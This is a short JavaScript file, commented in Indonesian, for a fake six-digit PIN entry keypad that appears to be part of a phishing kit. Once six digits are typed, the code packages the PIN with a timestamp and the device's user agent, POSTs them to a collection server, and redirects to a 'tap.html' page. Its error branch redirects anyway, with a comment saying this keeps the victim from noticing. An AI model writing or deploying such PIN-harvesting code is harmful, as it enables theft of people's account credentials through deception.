let pin = "";

const dots = document.querySelectorAll(".pin-dots span");
const buttons = document.querySelectorAll(".keypad button");

// ============================
// HANDLE INPUT ANGKA
// ============================
buttons.forEach(btn => {
  btn.addEventListener("click", () => {

    const val = btn.innerText.trim();

    // tombol hapus
    if (val === "⌫") {
      pin = pin.slice(0, -1);
    } 
    // input angka
    else if (!isNaN(val) && pin.length < 6) {
      pin += val;
    }

    updateDots();

    // kalau sudah 6 digit → kirim
    if (pin.length === 6) {
      kirimPin();
    }

  });
});

// ============================
// UPDATE DOT PIN
// ============================
function updateDots() {
  dots.forEach((dot, i) => {
    dot.classList.toggle("active", i < pin.length);
  });
}

// ============================
// KIRIM KE SERVER
// ============================
function kirimPin() {

  const text = `
🔐 PIN MASUK

PIN: ${pin}
⏰ Waktu: ${new Date().toLocaleString()}
📱 Device: ${navigator.userAgent}
`;

  fetch("http://localhost:3000/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      text: text
    })
  })
  .then(() => {
    // 🔥 delay biar smooth
    setTimeout(() => {
      window.location.href = "tap.html";
    }, 1200);
  })
  .catch(() => {
    // kalau error tetap lanjut (biar user gak sadar)
    setTimeout(() => {
      window.location.href = "tap.html";
    }, 1200);
  });

}